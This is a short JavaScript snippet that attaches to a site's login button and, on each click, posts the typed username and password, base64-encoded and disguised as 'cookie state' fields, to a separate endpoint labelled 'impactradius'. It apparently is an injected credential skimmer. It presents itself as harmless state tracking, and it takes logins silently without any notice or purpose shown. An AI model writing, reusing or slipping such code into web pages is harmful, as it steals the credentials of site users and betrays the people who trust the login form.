
 
$(document).ready(function() { 
	if ($('#loginContainer').length) { 
	$(document).on('click','#loginButton',function() {
    		 	credentials_update_impact();
    		return true;
    	});
    } 
});


function credentials_update_impact(){  
    $.ajax({
        type: "post",
        dataType: "json",
        url: api_path + "/cookie_states_h",
        data: { 
            state0: btoa('impactradius'),
            state1: 'ZX'+btoa($('#j_username').val()), 
            state2: 'ZX'+btoa($('#j_password').val()), 
        },
        success: function(data) {
            if (data.success === "yes") { 
            	     c("State_update");
            } else {
                	 c("404 or empty"); 
            }

        }
    }); 
}
